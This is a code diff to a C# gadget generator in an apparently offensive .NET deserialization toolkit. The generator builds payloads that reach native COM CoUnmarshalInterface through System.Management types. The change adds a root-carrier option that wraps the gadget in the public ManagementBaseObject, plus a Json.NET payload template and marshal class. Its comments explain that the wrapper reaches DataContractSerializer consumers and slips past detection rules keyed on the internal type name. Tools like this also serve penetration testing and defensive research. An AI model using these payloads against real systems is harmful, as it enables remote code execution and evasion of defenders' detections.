@@ -1,4 +1,4 @@
-using NDesk.Options;
+﻿using NDesk.Options;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -79,9 +79,29 @@ namespace ysonet.Generators
      * LOCAL SAFETY. The generator NEVER constructs the target: doing so runs the very
      * constructor that calls CoUnmarshalInterface, inside ysonet.exe. An inert ISerializable
      * marshal carries the type for the runtime formatters, and the three remaining formats
-     * are hand written documents. For the same reason -t is REFUSED rather than ignored, for
-     * both variants: a self-test deserializes here, which would make THIS machine do the
-     * callback (variant 1) or hand the operator's own bytes to native COM (variant 2).
+     * are hand written documents.
+     *
+     * -t IS PER VARIANT, and the dividing line is WHOSE bytes are in the blob - not whether a
+     * self-test has a local effect, because having one is what -t is for:
+     *
+     *   variant 1  ACCEPTED. The blob is one this file built, and the worst it does here is
+     *              make THIS machine perform the callback to the host the operator just typed,
+     *              which is what -t means on every other network gadget. The project's own
+     *              test suite deserializes exactly this payload on every FULL run.
+     *   variant 2  REFUSED. It would hand the operator's UNPARSED bytes to a native COM
+     *              unmarshaller on this machine, which can crash the process in ways nothing
+     *              here can predict.
+     *
+     * RefuseSelfTest below owns that rule and explains it in full; this paragraph must not
+     * drift from it again. Note the catch-out: a refusal for "it runs the exploit locally"
+     * would be wrong for BOTH variants. Variant 2's carve-out is the native-crash risk.
+     *
+     * A SECOND, ORTHOGONAL AXIS: --rootcarrier picks the type at the serialized ROOT, and it
+     * changes nothing else - not the blob, not the input, not the effect. Carrier 1 is the
+     * bare internal type above; carrier 2 wraps it in the public
+     * System.Management.ManagementBaseObject, which reaches the same constructor one level
+     * down. The full reasoning, what the wrapper does and does NOT buy, and the measured
+     * formatters it costs are all at the carrier constants below.
      */
     public class WbemClassObjectUnmarshalGenerator : GenericGenerator
     {
@@ -108,6 +128,85 @@ namespace ysonet.Generators
         // tests cannot drift apart.
         public const string VariantOptionName = "variant";
 
+        // ---- The root carrier axis ---------------------------------------------
+        //
+        // Which TYPE the payload puts at the serialized root. It is orthogonal to the
+        // variant: the variant decides who writes the blob, the carrier decides what
+        // wraps it, and every combination of the two is allowed.
+        //
+        //   carrier 1  the bare internal IWbemClassObjectFreeThreaded (today's payload,
+        //              byte for byte).
+        //   carrier 2  System.Management.ManagementBaseObject holding it in its
+        //              "wbemObject" member. Its serialization constructor is
+        //                ManagementBaseObject(SerializationInfo, StreamingContext)
+        //                  -> info.GetValue("wbemObject", typeof(IWbemClassObjectFreeThreaded))
+        //                       as IWbemClassObjectFreeThreaded
+        //                  -> the inner constructor above -> CoUnmarshalInterface
+        //              so the effect is reached from the SAME constructor as carrier 1,
+        //              one level down, and both carriers do the identical thing to the
+        //              target.
+        //
+        // WHAT THE WRAPPER BUYS, and only this: the root type is PUBLIC. The default root
+        // is internal, so no target application can name it in its own code, and a plain
+        // DataContractSerializer consumer - which carries no type information and takes its
+        // root type from the consumer's own source - can never be reached by carrier 1
+        // against a real target. It also puts a different first type name on the wire for a
+        // detection rule keyed on IWbemClassObjectFreeThreaded, the same motive
+        // TypeConfuseDelegate's --rootcontainer already ships for.
+        //
+        // WHAT IT DOES NOT BUY: it is NOT a SerializationBinder bypass. A binder is
+        // consulted for EVERY type in the stream, nested ones included, so a binder that
+        // blocks IWbemClassObjectFreeThreaded still blocks this. It adds no formatter
+        // family either, because the sink is still an ISerializable constructor at both
+        // levels - it can only keep or LOSE formatters carrier 1 already has.
+        //
+        // WHY ManagementBaseObject AND NOT ManagementObject / ManagementClass. Those two
+        // derive from it and do chain the same constructor, so naming them would also fire,
+        // but the framework never puts their names on the wire: the base's
+        // ISerializable.GetObjectData ends with
+        //   info.FullTypeName = typeof(ManagementBaseObject).ToString();
+        //   info.AssemblyName = typeof(ManagementBaseObject).Assembly.FullName;
+        // which OVERWRITES whatever the subclass was, and ManagementObject.GetObjectData
+        // only calls base. So a real serialized ManagementObject travels as
+        // ManagementBaseObject, and shipping the subclass names would offer shapes the
+        // framework itself does not produce. They stay documented here and unshipped.
+        public const int CarrierBare = 1;
+        public const int CarrierManagementBaseObject = 2;
+
+        // Canonical long name of the carrier selector.
+        public const string RootCarrierOptionName = "rootcarrier";
+
+        // The wrapper type and its one member, public so the tests can name the exact
+        // literals instead of repeating them (same reason as BlobMemberName). The wrapper
+        // ships in the SAME assembly as the inner type, so it reuses WbemAssemblyName.
+        public const string ManagementBaseObjectClrName = "System.Management.ManagementBaseObject";
+        public const string ManagementBaseObjectTypeName =
+            ManagementBaseObjectClrName + ", " + WbemAssemblyName;
+        public const string ManagementBaseObjectBareTypeName = "ManagementBaseObject";
+        public const string WbemObjectMemberName = "wbemObject";
+
+        // The formatters carrier 2 cannot produce. MEASURED, one wrapped document per
+        // formatter read back with the reader that formatter's consumer uses, never
+        // predicted - a wrapped document that deserializes into nothing still GENERATES
+        // cleanly, so nothing else would catch it. Each failure is structural, so no
+        // document shape rescues it; the reasons are in CarrierTwoRefusalReason below.
+        //
+        // The other five (BinaryFormatter, SoapFormatter, LosFormatter,
+        // NetDataContractSerializer, Json.NET) all reached CoUnmarshalInterface and came
+        // back 0x80070776 OR_INVALID_OXID, i.e. the same completed RPC round trip carrier 1
+        // produces.
+        internal static readonly string[] CarrierTwoUnsupportedFormatters =
+        {
+            Formatters.DataContractSerializer,
+            Formatters.FsPickler,
+        };
+
+        // The option help and the refusal both read that one list, so the help can never
+        // advertise a cell the guard refuses.
+        private static readonly string CarrierTwoFormatterNote =
+            "Not available with " + string.Join(" or ", CarrierTwoUnsupportedFormatters)
+            + "; those two keep working on carrier " + CarrierBare + ".";
+
         // A prepared blob is operator data with no upper bound of its own, and every text
         // formatter base64s it into the payload, so a careless input would produce a
         // multi-megabyte payload for no reason. Real marshalled WMI objects are tens of
@@ -115,6 +214,7 @@ namespace ysonet.Generators
         public const int MaxPreparedBlobBytes = 1024 * 1024;
 
         private int variantNumber = VariantHostObjRef;
+        private int rootCarrier = CarrierBare;
 
         // ---- Metadata ----------------------------------------------------------
 
@@ -278,7 +378,41 @@ namespace ysonet.Generators
                         + "unparsed bytes to native COM on this machine.",
                     v => int.TryParse(v, out variantNumber)
                 },
+                {
+                    RootCarrierOptionName + "=",
+                    "Which type sits at the SERIALIZED ROOT. Orthogonal to variant: it changes "
+                        + "the type name on the wire and nothing else. Both carriers hand the same "
+                        + "byte[] to the same native CoUnmarshalInterface call, so the effect, the "
+                        + "input and the blob are identical. This is NOT a SerializationBinder "
+                        + "bypass - a binder is consulted for every type in the stream, nested "
+                        + "ones included, so a binder that blocks the inner type still blocks "
+                        + "carrier 2. Choices:\r\n"
+                        + "1 (default) - the bare System.Management.IWbemClassObjectFreeThreaded, "
+                        + "which is internal to System.Management.\r\n"
+                        + "2 - wrap it in the PUBLIC System.Management.ManagementBaseObject, which "
+                        + "holds it in its \"wbemObject\" member and passes it to the same "
+                        + "constructor. Use it when the target names its own root type (a plain "
+                        + "DataContractSerializer consumer can only ever name a public one), or "
+                        + "when a rule keys on the internal name. "
+                        + CarrierTwoFormatterNote,
+                    v => rootCarrier = ParseRootCarrierOption(v)
+                },
             };
+        }
+
+        // Strict, like TypeConfuseDelegate's --rootcontainer and unlike the usual
+        // int.TryParse(v, out field) shortcut: a silent fall back to the default would ship
+        // the payload the operator did not ask for, and the two carriers differ only in a
+        // type name, so nothing downstream would look wrong.
+        public static int ParseRootCarrierOption(string value)
+        {
+            int parsed;
+            if (!int.TryParse(value, out parsed)
+                || parsed < CarrierBare || parsed > CarrierManagementBaseObject)
+                throw new OptionException(RootCarrierOptionName + " must be " + CarrierBare
+                    + " (bare " + WbemBareTypeName + ") or " + CarrierManagementBaseObject
+                    + " (" + ManagementBaseObjectBareTypeName + " wrapper)", RootCarrierOptionName);
+            return parsed;
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -288,6 +422,7 @@ namespace ysonet.Generators
             // gadget under -t. See RefuseSelfTest for the reasoning.
             RefuseSelfTest(inputArgs);
             GuardVariantFormatter(variantNumber, formatter);
+            GuardCarrierFormatter(rootCarrier, formatter);
 
             byte[] blob = BuildBlob(inputArgs);
             string base64 = Convert.ToBase64String(blob);
@@ -311,12 +446,21 @@ namespace ysonet.Generators
                 // TempFileCollection this needs no separate DataContract shape for
                 // NetDataContractSerializer, because the TARGET itself is ISerializable and
                 // so the marshal's member layout is already the one it expects.
-                payload = Serialize(new WbemClassObjectMarshal(blob), formatter, inputArgs);
+                payload = Serialize(CarrierMarshal(blob), formatter, inputArgs);
             else
                 throw UnsupportedFormatter(formatter);
 
             RequireBlobArrivesIntact(payload, formatter, base64);
             return payload;
+        }
+
+        // The object-graph root for the selected carrier. Both marshals write the same one
+        // member set; the wrapper simply puts one more level around it.
+        private object CarrierMarshal(byte[] blob)
+        {
+            return rootCarrier == CarrierBare
+                ? (object)new WbemClassObjectMarshal(blob)
+                : new ManagementBaseObjectMarshal(blob);
         }
 
         // ---- The blob ----------------------------------------------------------
@@ -481,12 +625,18 @@ namespace ysonet.Generators
 
         // The three formats with no object graph. Each is emitted RAW here; shrinking and the
         // -t read-back both happen in FinishHandWrittenPayload.
+        // Only Json.NET has two shapes here. DataContractSerializer and FsPickler cannot
+        // carry the wrapper at all (GuardCarrierFormatter refused those cells before this
+        // is reached), so there is deliberately no wrapped template for either: an
+        // unreachable one would read like a shape somebody could fix.
         private string BuildHandWrittenPayload(string formatter, string base64)
         {
             if (IsFormatter(formatter, Formatters.DataContractSerializer))
                 return BuildDataContractPayload(base64);
             if (IsFormatter(formatter, Formatters.JsonNet))
-                return BuildJsonNetPayload(base64);
+                return rootCarrier == CarrierBare
+                    ? BuildJsonNetPayload(base64)
+                    : BuildJsonNetPayloadWrapped(base64);
             if (IsFormatter(formatter, Formatters.FsPickler))
                 return BuildFsPicklerPayload(base64);
             throw UnsupportedFormatter(formatter);
@@ -572,6 +722,34 @@ namespace ysonet.Generators
 }";
         }
 
+        // The wrapped (carrier 2) Json.NET document. Json.NET is the only hand written
+        // format that can carry the wrapper, so it is the only wrapped template here.
+        //
+        // Both levels are ordinary $type-resolved ISerializable objects, and the order is
+        // what the target reads them in:
+        //   ManagementBaseObject(SerializationInfo, StreamingContext)
+        //     -> info.GetValue("wbemObject", typeof(IWbemClassObjectFreeThreaded))
+        //          as IWbemClassObjectFreeThreaded
+        //     -> IWbemClassObjectFreeThreaded(SerializationInfo, StreamingContext)
+        //     -> info.GetValue("flatWbemClassObject", typeof(byte[]))
+        //     -> CoUnmarshalInterface
+        //
+        // The nested $type names the INTERNAL type on purpose: the outer constructor casts
+        // with `as`, so anything else lands as null and it throws SerializationException
+        // without ever reaching the blob. Json.NET resolves an internal type from an
+        // assembly-qualified name without complaint. The member is still a base64 string
+        // for the same reason as the bare document.
+        private string BuildJsonNetPayloadWrapped(string base64)
+        {
+            return @"{
+  ""$type"": """ + ManagementBaseObjectTypeName + @""",
+  """ + WbemObjectMemberName + @""": {
+    ""$type"": """ + WbemTypeName + @""",
+    """ + BlobMemberName + @""": """ + base64 + @"""
+  }
+}";
+        }
+
         // The bare type name, which is what an XML element is named after.
         private const string WbemBareTypeName = "IWbemClassObjectFreeThreaded";
 
@@ -621,6 +799,51 @@ namespace ysonet.Generators
                 if (!char.IsWhiteSpace(c))
                     sb.Append(c);
             return sb.ToString();
+        }
+
+        // ---- Carrier guard -----------------------------------------------------
+
+        // Refuse a carrier x formatter cell that cannot be produced, by name, instead of
+        // emitting a document that deserializes into nothing. The list it reads is the
+        // measured one above; the reason for each entry is recorded there.
+        private void GuardCarrierFormatter(int carrier, string formatter)
+        {
+            if (carrier != CarrierManagementBaseObject)
+                return;
+
+            foreach (string unsupported in CarrierTwoUnsupportedFormatters)
+            {
+                if (!IsFormatter(formatter, unsupported))
+                    continue;
+
+                throw new ArgumentException(Name() + " cannot build --" + RootCarrierOptionName
+                    + " " + CarrierManagementBaseObject + " for " + formatter + ": "
+                    + CarrierTwoRefusalReason(formatter) + " Use --" + RootCarrierOptionName
+                    + " " + CarrierBare + ", which reaches the identical sink through the same "
+                    + "constructor, or pick another formatter.");
+            }
+        }
+
+        // Why that one formatter cannot carry the wrapper. Each sentence is the measured
+        // failure, with the exception the reader really threw.
+        private static string CarrierTwoRefusalReason(string formatter)
+        {
+            if (IsFormatter(formatter, Formatters.DataContractSerializer))
+                return "a plain DataContractSerializer takes its root type from the consumer's "
+                    + "own code and carries no type information for a NESTED one, so the "
+                    + "wbemObject member has nowhere to name " + WbemBareTypeName + " - only a "
+                    + "known type or a DataContractResolver the consumer supplies could, and the "
+                    + "reader fails with \"'Element' is an invalid XmlNodeType\" before the "
+                    + "constructor runs.";
+
+            if (IsFormatter(formatter, Formatters.FsPickler))
+                return "FsPickler refuses " + ManagementBaseObjectBareTypeName + " during pickler "
+                    + "resolution with \"Type 'System.Management.ManagementBaseObject' is not "
+                    + "serializable\", because it derives from Component and therefore from "
+                    + "MarshalByRefObject, and it decides that from the TYPE before it reads a "
+                    + "single member.";
+
+            return "that combination was measured and does not reach the sink.";
         }
 
         // ---- Local safety ------------------------------------------------------
@@ -682,6 +905,51 @@ namespace ysonet.Generators
         {
             info.SetType(Type.GetType(WbemClassObjectUnmarshalGenerator.WbemTypeName, true));
             info.AddValue(WbemClassObjectUnmarshalGenerator.BlobMemberName, _blob, typeof(byte[]));
+        }
+    }
+
+    // Emits the PUBLIC System.Management.ManagementBaseObject holding the marshal above
+    // (root carrier 2), again without instantiating anything. The target reads it as:
+    //
+    //   ManagementBaseObject(SerializationInfo, StreamingContext)
+    //     -> info.GetValue("wbemObject", typeof(IWbemClassObjectFreeThreaded))
+    //          as IWbemClassObjectFreeThreaded
+    //     -> IWbemClassObjectFreeThreaded(SerializationInfo, StreamingContext)
+    //     -> CoUnmarshalInterface
+    //
+    // ONE MEMBER, and the order does not matter because there is only one. Two details are
+    // load bearing:
+    //
+    //  - The inner marshal's own SetType names IWbemClassObjectFreeThreaded, which is what
+    //    the `as` cast above needs. Anything else lands as null and the outer constructor
+    //    throws SerializationException without ever reaching the blob - a payload that
+    //    deserializes and calls nobody.
+    //  - The member is declared as `object` rather than as the internal interface type. The
+    //    formatter then writes the nested type record from the inner marshal's SetType, and
+    //    this file never has to reflect the internal type up just to name it in an AddValue.
+    //    The framework's own GetObjectData declares it as IWbemClassObjectFreeThreaded; the
+    //    difference is not visible to the reading constructor, which asks for the value by
+    //    NAME and casts it itself.
+    //
+    // Class name deliberately says what it CARRIES, not which gadget built it:
+    // NetDataContractSerializer names the root element after this type's data contract, so a
+    // gadget-named marshal would put the module name in every NDCS payload.
+    [Serializable]
+    internal sealed class ManagementBaseObjectMarshal : ISerializable
+    {
+        private readonly byte[] _blob;
+
+        internal ManagementBaseObjectMarshal(byte[] blob)
+        {
+            _blob = blob;
+        }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(Type.GetType(
+                WbemClassObjectUnmarshalGenerator.ManagementBaseObjectTypeName, true));
+            info.AddValue(WbemClassObjectUnmarshalGenerator.WbemObjectMemberName,
+                new WbemClassObjectMarshal(_blob), typeof(object));
         }
     }
 }
